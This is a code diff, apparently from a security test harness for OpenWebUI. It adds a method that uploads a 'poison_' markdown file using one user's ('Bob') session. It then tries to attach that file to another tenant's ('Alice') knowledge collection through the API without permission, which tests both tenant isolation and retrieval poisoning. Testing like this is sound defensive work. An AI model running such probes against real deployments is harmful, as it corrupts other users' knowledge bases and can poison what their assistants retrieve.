@@ -59,6 +59,42 @@ class OpenWebUILifecycleMixin:
 
         return res
 
+    def inject_into_collection(
+        self,
+        base_url: str,
+        session: UserSession,
+        target_collection_id: str,
+        document: Any,
+    ) -> Dict[str, Any]:
+        """
+        Attempts to inject an unauthorized file into another tenant's knowledge collection.
+        Probes POST /api/v1/knowledge/{collection_id}/file/add with Bob's credentials.
+        """
+        base = base_url.rstrip("/")
+        filename = f"poison_{getattr(document, 'category', 'injection')}.md"
+        content_bytes = document.content.encode("utf-8") if hasattr(document, "content") else str(document).encode("utf-8")
+
+        upload_res = self._multipart_upload(
+            f"{base}/api/v1/files/",
+            filename=filename,
+            content=content_bytes,
+            headers=session.headers,
+        )
+        file_id = upload_res.get("id")
+        if not file_id:
+            return upload_res
+
+        session.metadata.setdefault("file_ids", []).append(file_id)
+
+        # Attempt to link into Alice's knowledge base without permissions
+        link_res = self._json_request(
+            f"{base}/api/v1/knowledge/{target_collection_id}/file/add",
+            method="POST",
+            data={"file_id": file_id},
+            headers=session.headers,
+        )
+        return link_res
+
     def enumerate_resources(
         self,
         base_url: str,
